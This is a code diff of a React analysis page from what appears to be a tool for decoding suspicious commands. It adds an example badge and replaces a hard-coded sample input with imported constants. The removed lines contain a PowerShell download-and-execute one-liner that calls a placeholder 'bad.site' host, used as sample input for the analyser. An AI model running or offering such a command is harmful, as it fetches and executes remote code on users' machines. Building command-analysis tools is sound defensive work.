@@ -15,6 +15,7 @@ import AnalysisSkeleton from "../../components/AnalysisSkeleton";
 import CommandInput from "../../components/CommandInput";
 import { ErrorMessage, InfoMessage } from "../../components/Messages";
 import IndicatorsSummaryTable from "../../components/IndicatorsSummaryTable";
+import { EXAMPLE_ENCODED_COMMAND, EXAMPLE_COMMAND_DESCRIPTION } from "../../../constants/examples";
 
 import { saveAnonymousAnalysis } from "../../../utils/cookies";
 import { getOrCreateSession, saveSessionFromBackend } from "../../../utils/session";
@@ -102,6 +103,17 @@ const DecodeUsageBadge = ({ decodeInfo }) => {
   console.log("🔍 [DecodeUsageBadge] decodeInfo:", decodeInfo);
   console.log("🔍 [DecodeUsageBadge] limit:", decodeInfo.limit, "Type:", typeof decodeInfo.limit);
   console.log("🔍 [DecodeUsageBadge] isUnlimited check:", decodeInfo.limit === null);
+
+  // ✅ Check if this is an example command (is_example flag from backend)
+  if (decodeInfo.is_example) {
+    return (
+      <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full border text-blue-400 border-blue-500/30 bg-blue-500/10 mb-4">
+        <span className="text-xs font-mono font-bold">
+          Free decoded command included (Example payload)
+        </span>
+      </div>
+    );
+  }
 
   const isUnlimited = decodeInfo.limit === null || decodeInfo.limit === -1 || decodeInfo.limit === Infinity || decodeInfo.limit > 1000;
   const current = decodeInfo.current_usage || 0;
@@ -483,10 +495,10 @@ export default function AnalysisDetailsPage() {
             <LoadingSpinner />
           </div>
         )}
-        <InfoMessage
-          message={!error && newCommand.length === 0 ? "Example: IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1')" : ""}
+          <InfoMessage
+          message={!error && newCommand.length === 0 ? EXAMPLE_COMMAND_DESCRIPTION : ""}
           clickable={!error && newCommand.length === 0}
-          onClick={() => setNewCommand("IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1')")}
+          onClick={() => setNewCommand(EXAMPLE_ENCODED_COMMAND)}
         />
       </div>
 
